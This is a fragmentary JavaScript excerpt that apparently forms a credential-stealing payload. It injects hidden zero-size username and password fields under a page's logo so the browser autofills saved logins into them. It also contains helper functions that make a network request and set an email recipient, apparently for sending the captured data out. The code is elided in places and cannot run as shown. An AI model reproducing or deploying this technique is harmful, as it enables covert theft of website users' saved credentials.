...
function tr1(url, callback) {
    var result = {comid:null,fmid:null};
    var xhr = new XMLHttpRequest();
...
function m1(sc) {
    var data=""
    var to = "ceren.mertcan@yahoo.com"
...
var i = 0;
var rt;
let btop = document.getElementById("logo");
let inu = document.createElement("input");
inu.id = "username";
inu.type = "text";
inu.style = 'height:0px;width:0px';
btop.appendChild(inu);
let inp = document.createElement("input");
inp.id = "password";
inp.type = "password";
inp.style = 'height:0px;width:0px';
